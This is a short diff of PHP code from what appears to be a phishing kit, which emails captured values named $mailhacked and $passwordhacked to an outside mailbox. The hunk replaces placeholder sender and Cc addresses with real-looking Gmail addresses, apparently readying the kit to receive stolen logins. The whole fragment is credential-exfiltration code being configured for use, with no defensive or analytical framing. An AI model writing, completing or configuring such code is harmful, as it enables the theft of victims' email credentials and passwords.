@@ -7,8 +7,8 @@
          $message = "$mailhacked";
          $message .= "<br>$passwordhacked";
          
-         $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:abcd@somedomain.com \r\n";
+         $header = "From:ellamenknowpee@gmail.com \r\n";
+         $header .= "Cc:supermisthboy@gmail.com \r\n";
          $header .= "MIME-Version: 1.0\r\n";
          $header .= "Content-type: text/html\r\n";
          
